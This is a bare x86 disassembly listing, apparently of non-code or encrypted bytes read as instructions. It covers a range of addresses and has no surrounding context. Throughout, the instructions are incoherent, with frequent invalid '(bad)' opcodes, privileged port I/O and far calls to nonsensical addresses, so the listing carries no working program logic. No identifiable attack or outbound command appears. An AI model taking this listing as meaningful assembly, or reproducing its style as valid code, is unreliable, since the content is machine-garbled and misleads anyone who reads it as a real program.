  41624f:	sbb    BYTE PTR [ecx-0x350a4eea],0xf
  416256:	xchg   edx,eax
  416257:	jmp    0x4162ae
  416259:	push   es
  41625a:	jnp    0x4162d1
  41625c:	sti    
  41625d:	in     eax,0x52
  41625f:	jle    0x4161ed
  416261:	xchg   edi,eax
  416262:	(bad)  
  416263:	enter  0xc3c9,0x96
  416267:	(bad)  
  416268:	mov    ebx,0xaafedb90
  41626d:	(bad)  
  41626e:	in     al,0xb2
  416270:	rcr    DWORD PTR [eax-0x1bce91b8],1
  416276:	xchg   BYTE PTR [ebp+0x16],bl
  416279:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41627a:	out    0x1a,al
  41627c:	sub    dl,bh
  41627e:	adc    al,cl
  416280:	and    ecx,DWORD PTR [edx-0x77bd0548]
  416286:	pop    ss
  416287:	dec    ecx
  416288:	cwde   
  416289:	les    edi,FWORD PTR [ebp+0x3b5a7791]
  41628f:	retf   0x60be
  416292:	aaa    
  416293:	ror    edx,1
  416295:	cld    
  416296:	jge    0x4162c2
  416298:	pop    eax
  416299:	jmp    0x95836a10
  41629e:	xchg   edi,eax
  41629f:	mov    cl,0xc
  4162a1:	jne    0x4162f6
  4162a3:	adc    eax,ebp
  4162a5:	inc    ebp
  4162a6:	call   0x9ca1:0x75096cb
  4162ad:	and    BYTE PTR [eax],ch
  4162af:	pop    esi
  4162b0:	sub    ebp,ecx
  4162b2:	cmc    
  4162b3:	mov    ch,0xfd
  4162b5:	xlat   BYTE PTR ds:[ebx]
  4162b6:	in     eax,dx
  4162b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162b8:	jne    0x416249
  4162ba:	pop    es
  4162bb:	dec    dl
  4162bd:	ins    BYTE PTR es:[edi],dx
  4162be:	jp     0x41632b
  4162c0:	fild   DWORD PTR [edx-0x3d0b5db0]
  4162c6:	sbb    DWORD PTR [esi-0x54b99b81],0x19eb8f68
  4162d0:	and    DWORD PTR [ecx-0x1e7b8393],eax
  4162d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162d7:	inc    esi
  4162d8:	pop    ebx
  4162d9:	daa    
  4162da:	adc    eax,0x3cd2824b
  4162df:	push   esi
  4162e0:	xchg   esi,eax
  4162e1:	or     dh,BYTE PTR [ebp+0x7]
  4162e4:	dec    esp
  4162e5:	pop    ebx
  4162e6:	add    eax,0xbacfd166
  4162eb:	(bad)  
  4162ec:	cmc    
  4162ed:	push   ss
  4162ee:	xchg   edx,eax
  4162ef:	dec    ebx
  4162f0:	daa    
  4162f1:	dec    eax
  4162f2:	out    dx,eax
  4162f3:	inc    edi
  4162f4:	out    0xf4,eax
  4162f6:	lock retf 
  4162f8:	int3   
  4162f9:	xor    dh,BYTE PTR ds:0x7d774ec9
  4162ff:	pop    ebp
  416300:	inc    DWORD PTR [edi+edx*8+0x53]
  416304:	std    
  416305:	or     eax,0x85035654
  41630a:	(bad)  
  41630b:	cmc    
  41630c:	cmp    DWORD PTR [ecx-0x38],ecx
  41630f:	(bad)  
  416310:	call   0x585c:0xa26ab952
  416317:	les    edi,FWORD PTR [ebx-0x1b05126a]
  41631d:	mov    ch,0xa
  41631f:	aas    
  416320:	rcl    DWORD PTR [eax-0x3e],1
  416323:	dec    edx
  416324:	sahf   
  416325:	popf   
  416326:	mov    ebp,0xa278da25
  41632b:	daa    
  41632c:	je     0x416313
  41632e:	mov    es:0x8cfdfff5,eax
  416334:	mov    eax,0x66da7122
  416339:	mov    DWORD PTR ds:0xaa39c93e,edi
  41633f:	sbb    BYTE PTR [ecx],0xe8
  416342:	js     0x416359
  416344:	push   esi
  416345:	mov    bh,0x81
  416347:	cmc    
  416348:	ror    DWORD PTR [ebx],cl
  41634a:	pop    ds
  41634b:	and    dh,BYTE PTR gs:[eax]
  41634e:	outs   dx,DWORD PTR ds:[esi]
  41634f:	enter  0x8b8e,0x13
  416353:	jnp    0x416308
  416355:	adc    al,dh
  416357:	jae    0x416355
  416359:	mov    eax,ds:0xb4497676
  41635e:	inc    ebp
  41635f:	push   ss
  416360:	mov    cl,0x3e
  416362:	push   edx
  416363:	sub    DWORD PTR [ebp-0x67],edi
  416366:	or     cl,BYTE PTR [ebp+edi*2-0x51dbc3a5]
  41636d:	mov    ebp,0x40a6887b
  416372:	pop    eax
  416373:	push   eax
  416374:	and    BYTE PTR [ecx+eax*4-0x577a1a4b],cl
  41637b:	popf   
  41637c:	loop   0x416346
  41637e:	sub    ebp,esi
  416380:	fsub   QWORD PTR [ebx-0x36]
  416383:	jnp    0x41631e
  416385:	dec    edx
  416386:	dec    eax
  416387:	pop    es
  416388:	adc    ch,BYTE PTR [ecx]
  41638a:	sub    eax,DWORD PTR es:0x94b9b5a4
  416391:	sbb    al,0x85
  416393:	jge    0x416351
  416395:	int3   
  416396:	sbb    DWORD PTR [edi],ecx
  416398:	enter  0x6050,0x1c
  41639c:	mov    ds:0xf3a49207,eax
  4163a1:	add    al,0x75
  4163a3:	sahf   
  4163a4:	enter  0xcabf,0x58
  4163a8:	cmc    
  4163a9:	cld    
  4163aa:	hlt    
  4163ab:	pop    ebx
  4163ac:	aam    0x63
  4163ae:	loop   0x41634e
  4163b0:	jg     0x4163e6
  4163b2:	lock add dl,cl
  4163b5:	bnd jg 0x41637f
  4163b8:	and    al,0x9b
  4163ba:	scas   eax,DWORD PTR es:[edi]
  4163bb:	dec    ebx
  4163bc:	mov    ah,0x68
  4163be:	ficomp DWORD PTR [eax]
  4163c0:	or     BYTE PTR ss:[esp+eax*8-0x17],cl
  4163c5:	nop
  4163c6:	sub    eax,0xa31c5f8b
  4163cb:	mov    fs,eax
  4163cd:	push   edx
  4163ce:	pop    es
  4163cf:	cwde   
  4163d0:	cmp    al,0xb2
  4163d2:	cwde   
  4163d3:	and    DWORD PTR [ebp+0x3fc5b27a],esp
  4163d9:	ins    BYTE PTR es:[edi],dx
  4163da:	aaa    
  4163db:	addr16 ss leave 
  4163de:	aad    0x2e
  4163e0:	push   ecx
  4163e1:	call   0x5a0fad7d
  4163e6:	ret    0xaf8
  4163e9:	mov    BYTE PTR [esi],al
  4163eb:	icebp  
  4163ec:	stos   DWORD PTR es:[edi],eax
  4163ed:	jg     0x416433
  4163ef:	mov    eax,ds:0xdd6aeae4
  4163f4:	push   ebp
  4163f5:	add    BYTE PTR [edx],ch
  4163f7:	xor    al,BYTE PTR [ebp-0x238c5c95]
  4163fd:	inc    esi
  4163fe:	or     eax,0xe915a61a
  416403:	add    DWORD PTR [ecx+0x73],esi
  416406:	adc    ch,BYTE PTR [ebx-0x12c4d2e1]
  41640c:	sub    BYTE PTR [edi],ch
  41640e:	sub    DWORD PTR [ebx-0x78616213],ebp
  416414:	pop    ebx
  416415:	push   esi
  416416:	pop    edi
  416417:	inc    edx
  416418:	mov    al,BYTE PTR [eax]
  41641a:	add    ch,BYTE PTR ds:0x687f3877
  416420:	add    ah,BYTE PTR [ebx]
  416422:	retf   
  416423:	mov    ds:0x397faf6c,al
  416428:	pop    ss
  416429:	repz sub ecx,DWORD PTR [edi]
  41642c:	icebp  
  41642d:	cwde   
  41642e:	and    DWORD PTR [ebx+0x77],edi
  416431:	mov    ebp,0x4bf79ab3
  416436:	jo     0x41641f
  416438:	inc    esp
  416439:	rol    esi,cl
  41643b:	push   cs
  41643c:	neg    DWORD PTR [eax*8+0x94b03e3]
  416443:	inc    edx
  416444:	inc    eax
  416445:	and    esp,DWORD PTR [ebp-0x24]
  416448:	inc    eax
  416449:	shl    DWORD PTR [edx+0x4c49941d],1
  41644f:	cmc    
  416450:	(bad)  
  416451:	scas   al,BYTE PTR es:[edi]
  416452:	in     al,0x7
  416454:	(bad)  
  416455:	and    bh,ch
  416457:	pinsrw mm2,WORD PTR [ecx],0xc5
  41645b:	sar    DWORD PTR [eax+0x2a994dc8],0xe6
  416462:	inc    edi
  416463:	xor    DWORD PTR [esi-0x2eb39ba3],edx
  416469:	sub    al,0x7a
  41646b:	cmp    eax,0xc54fbeb9
  416470:	jg     0x41649d
  416472:	push   edx
  416473:	mov    bl,0xc7
  416475:	imul   edx,edx,0x2f5db1e4
  41647b:	mov    ch,0x4b
  41647d:	(bad)  
  41647e:	cmp    al,0xe7
  416480:	inc    esi
  416481:	xchg   edi,eax
  416482:	outs   dx,DWORD PTR ds:[esi]
  416483:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416484:	cwde   
  416485:	cmp    esi,eax
  416487:	or     DWORD PTR [edi+0x3c5de0b9],ebp
  41648d:	pop    esp
  41648e:	out    dx,al
  41648f:	xor    DWORD PTR [ebx-0x60],esp
  416492:	xor    ecx,ebp
  416494:	test   eax,0xb8707f16
  416499:	imul   edi,DWORD PTR [esi],0xffffffe2
  41649c:	shl    ch,cl
  41649e:	lods   al,BYTE PTR ds:[esi]
  41649f:	rcr    cl,cl
  4164a1:	dec    eax
  4164a2:	(bad)  [ecx-0x12296a58]
  4164a8:	test   eax,0x4464b7f5
  4164ad:	jne    0x41649f
  4164af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164b0:	sbb    ebp,DWORD PTR [ebx+ecx*1-0x4d]
  4164b4:	cld    
  4164b5:	dec    esi
  4164b6:	les    esp,FWORD PTR [ebp+0x16]
  4164b9:	into   
  4164ba:	mov    BYTE PTR [eax-0x305140e],al
  4164c0:	call   0x9046:0x3fac1e7c
  4164c7:	ja     0x416490
  4164c9:	adc    eax,0x8b5105e2
  4164ce:	pushf  
  4164cf:	add    eax,0xd3754cb3
  4164d4:	stos   BYTE PTR es:[edi],al
  4164d5:	out    dx,eax
  4164d6:	or     DWORD PTR [edi-0x78],esp
  4164d9:	pop    ds
  4164da:	daa    
  4164db:	jb     0x416478
  4164dd:	sbb    BYTE PTR [esi],cl
  4164df:	dec    edx
  4164e0:	inc    ebp
  4164e1:	mov    dl,0x70
  4164e3:	sbb    esi,edi
  4164e5:	js     0x416490
  4164e7:	fnstcw WORD PTR [ebx]
  4164e9:	into   
  4164ea:	add    dl,BYTE PTR [eax+0x3d7d2fcc]
  4164f0:	ror    DWORD PTR [eax],0xd1
  4164f3:	sahf   
  4164f4:	pop    ds
  4164f5:	sbb    al,BYTE PTR [edi-0x1c8af70f]
  4164fb:	mov    edx,0x3b2a70d6
  416500:	jl     0x41656c
  416502:	sbb    eax,0x72b7838a
  416507:	pop    ds
  416508:	xor    BYTE PTR [ebx+edi*8],dh
  41650b:	jne    0x41657b
  41650d:	cdq    
  41650e:	xchg   esi,eax
  41650f:	ds aas 
  416511:	sub    BYTE PTR [ecx+0x6eb9d9c6],0x44
  416518:	push   es
  416519:	mov    al,0xb0
  41651b:	les    edi,FWORD PTR [esi+0xc]
  41651e:	jmp    0x3b6a0b31
  416523:	jge    0x4164f9
  416525:	mul    BYTE PTR [edx]
  416527:	mov    bh,0x48
  416529:	jno    0x4164f4
  41652b:	dec    ebp
  41652c:	sbb    ebx,DWORD PTR ds:0x89a2a6b7
  416532:	mov    bl,0x68
  416534:	call   0xf0b01be7
  416539:	mov    edx,0x366f9796
  41653e:	push   ds
  41653f:	xchg   edi,eax
  416540:	sbb    DWORD PTR [ecx+ebx*1],0x24
  416544:	add    bl,bl
  416546:	lds    esp,FWORD PTR [ebx]
  416548:	popf   
  416549:	sbb    al,0x38
  41654b:	jecxz  0x4164da
  41654d:	fcomp  DWORD PTR [ecx-0x70]
  416550:	out    0xfe,al
  416552:	dec    ebp
  416553:	lods   al,BYTE PTR ds:[esi]
  416554:	lahf   
  416555:	ss stc 
  416557:	ret    
  416558:	sbb    eax,0x94140d2c
  41655d:	add    BYTE PTR [eax],al
  41655f:	add    BYTE PTR [eax],al
  416561:	add    al,bh
  416563:	pminsw mm6,QWORD PTR [edi-0x1]
  416567:	idiv   ebp
  416569:	(bad)  
  41656a:	repz push esi
  41656c:	retf   0xcdf1
  41656f:	inc    esp
  416570:	sbb    edi,DWORD PTR [ebx]
  416572:	push   edx
  416573:	jecxz  0x416575
  416575:	add    bl,dh
  416577:	add    al,0x0
  416579:	add    BYTE PTR [ebx+0x735735f7],al
  41657f:	aam    0xff
  416581:	jo     0x4165bb
  416583:	mov    eax,0x4de870ea
  416588:	clc    
  416589:	sti    
  41658a:	ja     0x4165dd
  41658c:	shl    esp,cl
  41658e:	push   ss
  41658f:	sbb    cl,BYTE PTR [edx]
  416591:	es sti 
  416593:	cmp    ebx,DWORD PTR [esi]
  416595:	int3   
  416596:	mov    al,0xd6
  416598:	shl    BYTE PTR ds:0x1d203f78,0xea
  41659f:	mov    edx,0x5e25f8de
  4165a4:	inc    ebp
  4165a5:	xor    DWORD PTR [edx+esi*4+0x47],esi
  4165a9:	cs pop ebx
  4165ab:	xor    al,0x81
  4165ad:	mov    ecx,gs
  4165af:	rcl    DWORD PTR [ebp+0x9],cl
  4165b2:	rcl    BYTE PTR [edx],cl
  4165b4:	pop    ecx
  4165b5:	fldenv [ecx]
  4165b7:	jno    0x416603
  4165b9:	ret    0x2b3
  4165bc:	pop    es
  4165bd:	cmp    eax,0xffffffda
  4165c0:	jmp    DWORD PTR gs:[ebx+0x2835962c]
  4165c7:	in     eax,dx
  4165c8:	inc    esi
  4165c9:	sbb    eax,0x761e07bc
  4165ce:	es push ebp
  4165d0:	cdq    
  4165d1:	xchg   esi,eax
  4165d2:	cmc    
  4165d3:	cdq    
  4165d4:	pusha  
  4165d5:	and    eax,0xfd1b0ffe
  4165da:	call   FWORD PTR [edx-0x3e]
  4165dd:	sbb    cl,BYTE PTR [eax+0x79c9e305]
  4165e3:	xor    DWORD PTR [esp+edi*8],ecx
  4165e6:	jge    0x41662b
  4165e8:	int    0x61
  4165ea:	or     dl,BYTE PTR [eax+esi*8+0x429c89e9]
  4165f1:	pop    eax
  4165f2:	iret   
  4165f3:	cld    
  4165f4:	push   ss
  4165f5:	cmp    DWORD PTR [ebx],ecx
  4165f7:	sti    
  4165f8:	pop    ss
  4165f9:	pop    edx
  4165fa:	push   ebx
  4165fb:	push   es
  4165fc:	cld    
  4165fd:	outs   dx,DWORD PTR ds:[esi]
  4165fe:	push   edi
  4165ff:	xchg   ah,ah
  416601:	adc    DWORD PTR [ebx+ecx*8],edi
  416604:	std    
  416605:	xchg   ebp,eax
  416606:	pop    esp
  416607:	push   ebx
  416608:	scas   eax,DWORD PTR es:[edi]
  416609:	adc    DWORD PTR [ebx+0x13ac646f],ebp
  41660f:	fisub  DWORD PTR [ecx+0x7f]
  416612:	jmp    0xed724af0
  416617:	push   esi
  416618:	push   edi
  416619:	mov    eax,0xf51a65e0
  41661e:	dec    edi
  41661f:	and    DWORD PTR ds:[esi-0x65],0xb35d03bc
  416627:	cmp    BYTE PTR [esi-0x4d],cl
  41662a:	sbb    al,0xbf
  41662c:	jae    0x4165d7
  41662e:	cmp    ebp,DWORD PTR [ebx]
  416630:	mov    eax,ds:0x40da247f
  416635:	pop    esp
  416636:	fwait
  416637:	mov    ebx,0xb7a94076
  41663c:	adc    al,0x8f
  41663e:	cmp    DWORD PTR [esi-0x5b],esi
  416641:	jae    0x416627
  416643:	push   eax
  416644:	retf   
  416645:	(bad)  
  416646:	pop    esp
  416647:	dec    edx
  416648:	stos   BYTE PTR es:[edi],al
  416649:	push   ecx
  41664a:	mov    esi,0xda40334b
  41664f:	push   ecx
  416650:	ds dec ecx
  416652:	sub    cl,cl
  416654:	dec    esp
  416655:	bound  ebx,QWORD PTR [eax+0x64692e9c]
  41665b:	stc    
  41665c:	mov    cl,0xd7
  41665e:	test   cl,bh
  416660:	adc    dl,al
  416662:	lds    edx,FWORD PTR [eax-0x67c82df6]
  416668:	inc    ecx
  416669:	mov    ah,0x9c
  41666b:	smsw   WORD PTR [ebx-0x1]
  41666f:	std    
  416670:	jmp    FWORD PTR [eax-0x2be66e07]
  416676:	imul   edx,DWORD PTR [edi+0x55bd0775],0xffffff9a
  41667d:	or     BYTE PTR [esi+0x4b],ch
  416680:	pusha  
  416681:	xchg   ebx,eax
  416682:	pop    edx
  416683:	cwde   
  416684:	mov    edi,0x37942523
  416689:	mov    dh,0x6a
  41668b:	loopne 0x416646
  41668d:	inc    esi
  41668e:	aad    0x8f
  416690:	rcr    dl,cl
  416692:	(bad)  
  416693:	cmp    eax,0xec01ad80
  416698:	mov    eax,ds:0xb9641209
  41669d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41669e:	stc    
  41669f:	add    BYTE PTR [ebp+0x46c7d54f],bh
  4166a5:	jae    0x4166fc
  4166a7:	adc    ah,bh
  4166a9:	xchg   esp,eax
  4166aa:	or     esp,DWORD PTR [ebx+ebp*2]
  4166ad:	jo     0x41667a
  4166af:	call   0x1798:0x59cdc96a
  4166b6:	inc    esp
  4166b7:	dec    eax
  4166b8:	jl     0x416646
  4166ba:	imul   eax,DWORD PTR [ebx],0xffffff90
  4166bd:	rcl    DWORD PTR [esi-0x66],0xb4
  4166c1:	inc    ecx
  4166c2:	xor    DWORD PTR [esp+ebp*1],edx
  4166c5:	mov    eax,0x8a39cb45
  4166ca:	sub    eax,0x4d82ae86
  4166cf:	jnp    0x4166c3
  4166d1:	mov    esi,0xb369005a
  4166d6:	mov    esp,DWORD PTR [edi+0x0]
  4166d9:	inc    esi
  4166da:	or     DWORD PTR [ebp+ecx*8+0x5329207f],0x4d
  4166e2:	into   
  4166e3:	add    DWORD PTR [esi],0xd360c31c
  4166e9:	(bad)  
  4166ea:	(bad)
  4166ee:	outs   dx,BYTE PTR ds:[esi]
  4166ef:	gs jge 0x41675b
  4166f2:	push   ds
  4166f3:	jl     0x416734
  4166f5:	test   eax,0x1fb74b2d
  4166fa:	mov    eax,ds:0xf5ac4672
  4166ff:	cmp    BYTE PTR [ecx+eax*4],ah
  416702:	mov    al,0x86
  416704:	xchg   ecx,eax
  416705:	cs imul edx,ebp,0x64b0fbce
  41670c:	adc    al,0xb4
  41670e:	and    cl,BYTE PTR [ecx-0x1b]
  416711:	xlat   BYTE PTR ds:[ebx]
  416712:	inc    edx
  416713:	xchg   edx,eax
  416714:	stos   DWORD PTR es:[edi],eax
  416715:	mov    al,BYTE PTR [ebx+0x28b55e61]
  41671b:	sti    
  41671c:	mov    dh,BYTE PTR [esp+ebp*2-0x2ea300de]
  416723:	xchg   esp,eax
  416724:	shl    DWORD PTR [edx-0x2],1
  416727:	dec    eax
  416728:	cmpps  xmm2,XMMWORD PTR [eax+0x7514515f],0x8f
  416730:	shl    cl,1
  416732:	dec    ecx
  416733:	aas    
  416734:	push   ecx
  416735:	(bad)  
  416736:	mov    dh,dl
  416738:	ret    
  416739:	push   edx
  41673a:	test   eax,0x86d85220
  41673f:	ins    BYTE PTR es:[edi],dx
  416740:	(bad)  
  416741:	jbe    0x416716
  416743:	sbb    cl,BYTE PTR [ebp-0x53f479e0]
  416749:	and    DWORD PTR [esi-0x19],eax
  41674c:	adc    ebp,DWORD PTR [ebp+0x4f15044]
  416752:	push   ebx
  416753:	(bad)  
  416754:	jns    0x41671c
  416756:	sbb    eax,0xa366f58a
  41675b:	pop    fs
  41675d:	stos   DWORD PTR es:[edi],eax
  41675e:	cs fwait
  416760:	dec    ebx
  416761:	loop   0x41672b
  416763:	retf   0x1dfa
  416766:	je     0x41670d
  416768:	ret    0x777
  41676b:	out    0xac,al
  41676d:	outs   dx,BYTE PTR ds:[esi]
  41676e:	stc    
  41676f:	mov    bh,0xf2
  416771:	pop    es
  416772:	mov    BYTE PTR [eax-0x44],0x6
  416776:	jne    0x4167ed
  416778:	jb     0x41673b
  41677a:	sbb    dh,BYTE PTR [edi-0x55]
  41677d:	hlt    
  41677e:	sbb    DWORD PTR [edi],edi
  416780:	stos   BYTE PTR es:[edi],al
  416781:	dec    ebx
  416782:	fs dec esi
  416784:	xor    BYTE PTR [ebx+0x140d3737],dl
  41678a:	cld    
  41678b:	mov    BYTE PTR [ebp-0x6f24ac6b],dh
  416791:	xor    bh,al
  416793:	clc    
  416794:	xchg   edi,eax
  416795:	inc    esp
  416796:	fistp  QWORD PTR [edx-0x7e]
  416799:	pusha  
  41679a:	stc    
  41679b:	(bad)  
  41679c:	gs scas al,BYTE PTR es:[edi]
  41679e:	repz icebp 
  4167a0:	dec    edx
  4167a1:	dec    esi
  4167a2:	xor    DWORD PTR [esi+eax*4-0x644c5857],ebp
  4167a9:	les    esp,FWORD PTR [ebx-0x68f0260b]
  4167af:	popa   
  4167b0:	fsubrp st(6),st
  4167b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167b3:	pop    es
  4167b4:	xchg   ecx,eax
  4167b5:	(bad)  
  4167b6:	outs   dx,BYTE PTR ds:[esi]
  4167b7:	pop    edx
  4167b8:	inc    ebx
  4167b9:	mov    edi,0xcadcd314
  4167be:	xor    al,0x89
  4167c0:	jne    0x4167f1
  4167c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167c3:	inc    ebp
  4167c4:	hlt    
  4167c5:	xor    al,0x18
  4167c7:	cmp    ebx,ebx
  4167c9:	or     ah,cl
  4167cb:	fcmove st,st(7)
  4167cd:	aas    
  4167ce:	mov    ecx,0x3325953f
  4167d3:	icebp  
  4167d4:	test   DWORD PTR ds:0x52100e82,ebp
  4167da:	or     ch,dh
  4167dc:	outs   dx,DWORD PTR ds:[esi]
  4167dd:	xor    BYTE PTR [ebp-0x50],bh
  4167e0:	pop    ebx
  4167e1:	mov    ebp,0x3c6c6eb8
  4167e6:	adc    al,0xc4
  4167e8:	test   DWORD PTR [esp+esi*2],0x4e56b373
  4167ef:	pop    ss
  4167f0:	mov    ecx,0x5ebad167
  4167f5:	or     al,0x98
  4167f7:	jb     0x416864
  4167f9:	xchg   BYTE PTR [ebp-0x71],bh
  4167fc:	dec    edi
  4167fd:	shl    DWORD PTR [edx-0x4664c36c],0x73
  416804:	xchg   DWORD PTR [esi+ebx*4-0x67],ebx
  416808:	stos   DWORD PTR es:[edi],eax
  416809:	(bad)  
  41680a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41680b:	addr16 out dx,eax
  41680d:	out    0xc9,al
  41680f:	add    DWORD PTR [edi-0x59c92496],esi
  416815:	std    
  416816:	les    esp,FWORD PTR [edx]
  416818:	dec    eax
  416819:	adc    ah,cl
  41681b:	or     al,0x62
  41681d:	sbb    DWORD PTR ds:0xda772eb2,ecx
  416823:	jg     0x416811
  416825:	dec    edx
  416826:	add    BYTE PTR cs:[ebp-0x33],cl
  41682a:	int3   
  41682b:	sbb    al,0x7
  41682d:	sar    DWORD PTR [edi+0x6ae53419],1
  416833:	inc    ebx
  416834:	pop    edi
  416835:	xor    al,0x66
  416837:	jae    0x41684f
  416839:	div    DWORD PTR [edx-0x164df001]
  41683f:	loope  0x4168b3
  416841:	mov    cl,0x46
  416843:	inc    esi
  416844:	das    
  416845:	inc    edx
  416846:	push   esi
  416847:	pop    esp
  416848:	ror    BYTE PTR [ebx],1
  41684a:	jo     0x416825
  41684c:	imul   eax,esi,0xffffffd8
  41684f:	ins    DWORD PTR es:[edi],dx
  416850:	cld    
  416851:	lahf   
  416852:	nop
  416853:	dec    eax
  416854:	sub    esi,DWORD PTR [esi]
  416856:	cmp    BYTE PTR [esi],cl
  416858:	inc    ecx
  416859:	push   es
  41685a:	jb     0x416897
  41685c:	cmp    eax,DWORD PTR [edi-0x32]
  41685f:	jle    0x41687b
  416861:	nop
  416862:	dec    esp
  416863:	pop    ebx
  416864:	fsubr  QWORD PTR [edx-0x3c]
  416867:	sbb    esp,edi
  416869:	or     dh,BYTE PTR [eax]
  41686b:	mov    ebx,0xc37cac36
  416870:	out    0x5f,al
  416872:	mov    esp,0xa830745e
  416877:	lock cmp DWORD PTR [edi+ebp*2-0x1de1cff7],edi
  41687f:	push   0xf27e29e1
  416884:	mov    bl,0x0
  416886:	sub    BYTE PTR ds:0x4f09c689,al
  41688c:	inc    esi
  41688d:	xlat   BYTE PTR fs:[ebx]
  41688f:	(bad)  
  416890:	je     0x41681f
  416892:	shl    DWORD PTR [edi],0x35
  416895:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416896:	add    bh,bh
  416898:	xchg   BYTE PTR [ecx+0x3e07b5a7],bl
  41689e:	ins    BYTE PTR es:[edi],dx
  41689f:	jne    0x41683a
  4168a1:	or     ebp,eax
  4168a3:	xor    BYTE PTR [esi-0x7446c10c],dl
  4168a9:	(bad)  
  4168aa:	outs   dx,BYTE PTR ds:[esi]
  4168ab:	mov    ch,0x7a
  4168ad:	pusha  
  4168ae:	jmp    0x41692a
  4168b0:	lock outs dx,DWORD PTR ds:[esi]
  4168b2:	mov    ch,0x96
  4168b4:	pop    eax
  4168b5:	imul   edx,DWORD PTR [ebx+ecx*1-0x5e],0xeb8950
  4168bd:	adc    ebp,esp
  4168bf:	arpl   WORD PTR [ebx+0x2de52ec5],dx
  4168c5:	jbe    0x416891
  4168c7:	jl     0x4168db
  4168c9:	xchg   esi,eax
  4168ca:	out    0x4f,eax
  4168cc:	iret   
  4168cd:	push   eax
  4168ce:	aaa    
  4168cf:	sub    BYTE PTR [ecx+0x12],bl
  4168d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168d3:	icebp  
  4168d4:	jne    0x41690a
  4168d6:	or     esp,DWORD PTR [ecx+0x762855f9]
  4168dc:	test   DWORD PTR [esi-0x44],ebx
  4168df:	xchg   DWORD PTR [ebx-0x8a1fe3e],esi
  4168e5:	or     esp,esp
  4168e7:	jb     0x4168ca
  4168e9:	jecxz  0x4168aa
  4168eb:	jae    0x416941
  4168ed:	mov    esp,DWORD PTR [edx]
  4168ef:	dec    edx
  4168f1:	dec    ebp
  4168f2:	push   ecx
  4168f3:	pop    ebp
  4168f4:	outs   dx,BYTE PTR ds:[esi]
  4168f5:	sbb    DWORD PTR [esi],ecx
  4168f7:	cwde   
  4168f8:	hlt    
  4168f9:	push   ss
  4168fa:	aas    
  4168fb:	dec    edi
  4168fc:	fld    QWORD PTR [eax+0x418bcbd6]
  416902:	icebp  
  416903:	aas    
  416904:	dec    ebp
  416905:	mov    ebx,0x7ce9f2a1
  41690a:	outs   dx,DWORD PTR ds:[esi]
  41690b:	in     eax,0xa3
  41690d:	cmp    esp,DWORD PTR [esi+0x200f253a]
  416913:	clc    
  416914:	pop    ds
  416915:	fcmove st,st(6)
  416917:	arpl   si,di
  416919:	inc    edi
  41691a:	into   
  41691b:	mov    esi,cs
  41691d:	add    eax,0x8fa314b5
  416922:	imul   esi,ebx,0x41346ea1
  416928:	cmp    bh,BYTE PTR [edi-0x3f961090]
  41692e:	loopne 0x41694d
  416930:	hlt    
  416931:	shr    BYTE PTR [ecx-0x3822aacb],cl
  416937:	or     ch,BYTE PTR [edi+0x40d9db93]
  41693d:	push   ss
  41693e:	add    DWORD PTR [eax+0x76],edx
  416941:	and    eax,0x327a7952
  416946:	and    DWORD PTR [esp+eax*2],esp
  416949:	inc    edx
  41694a:	pop    ds
  41694b:	sub    al,0xea
  41694d:	or     edi,esp
  41694f:	inc    esi
  416950:	xchg   edx,eax
  416951:	dec    eax
  416952:	arpl   WORD PTR [edx+0x5e],si
  416955:	lea    edi,[edi]
  416957:	lahf   
  416958:	mov    ah,0x33
  41695b:	ror    BYTE PTR [eax+0x133dd2c2],1
  416961:	pop    ecx
  416962:	jp     0x41693d
  416964:	jmp    FWORD PTR [ebx-0x63]
  416967:	(bad)
  41696a:	xchg   ebp,eax
  41696b:	or     al,BYTE PTR [eax-0x1a4f57d1]
  416971:	hlt    
  416972:	lahf   
  416973:	mov    BYTE PTR [edx],dl
  416975:	mov    ebp,0x447f3f7d
  41697a:	bound  esi,QWORD PTR [ebx+esi*2-0x4a97c5c5]
  416981:	pop    ds
  416982:	xchg   dl,bh
  416984:	mov    cl,0x73
  416986:	jle    0x4169da
  416988:	add    DWORD PTR [ebp+0x2c],edi
  41698b:	fstp   QWORD PTR [edi+0x61788797]
  416991:	push   cs
  416992:	fcom   DWORD PTR [edx+0x20f3c496]
  416998:	int    0x59
  41699a:	or     eax,0x5c0833fd
  41699f:	sub    DWORD PTR [ebx-0x3f95e37d],ebx
  4169a5:	ss es push 0x18c6bdc8
  4169ac:	fbld   TBYTE PTR [ebp+0x3cfa5739]
  4169b2:	jns    0x4169c1
  4169b4:	fwait
  4169b5:	xor    eax,0x761025da
  4169ba:	xchg   BYTE PTR [ebp+ecx*1-0x2dcb868d],al
  4169c1:	jno    0x416a07
  4169c3:	fldcw  WORD PTR [edx+eax*1-0x5ad6f208]
  4169ca:	lahf   
  4169cb:	jns    0x416a25
  4169cd:	call   0xc4fc2db8
  4169d2:	mov    ah,0xac
  4169d4:	pop    eax
  4169d5:	sbb    BYTE PTR [edi+0x677ded19],ch
  4169db:	or     BYTE PTR [ecx+0x43],dh
  4169de:	mov    WORD PTR [ecx+ebx*1-0x8],gs
  4169e2:	pop    ss
  4169e3:	mov    ah,0x3e
  4169e5:	sti    
  4169e6:	xor    eax,0xa8f77922
  4169eb:	push   edi
  4169ec:	cld    
  4169ed:	cs stos DWORD PTR es:[edi],eax
  4169ef:	(bad)  
  4169f0:	fisttp WORD PTR [eax+0x38]
  4169f3:	int    0x85
  4169f5:	inc    ebx
  4169f6:	push   ss
  4169f7:	aas    
  4169f8:	leave  
  4169f9:	hlt    
  4169fa:	sbb    BYTE PTR [eax+eiz*8-0x57],cl
  4169fe:	pop    ss
  4169ff:	add    eax,0xd1a75fb9
  416a04:	xchg   ebx,eax
  416a05:	bound  edx,QWORD PTR [esi]
  416a07:	std    
  416a08:	pop    ecx
  416a09:	mov    ?,WORD PTR [edi]
  416a0b:	jnp    0x416a20
  416a0d:	call   0xd47b4c20
  416a12:	ds mov dl,0x87
  416a15:	imul   edx,DWORD PTR [esp+edx*8+0xe],0x34
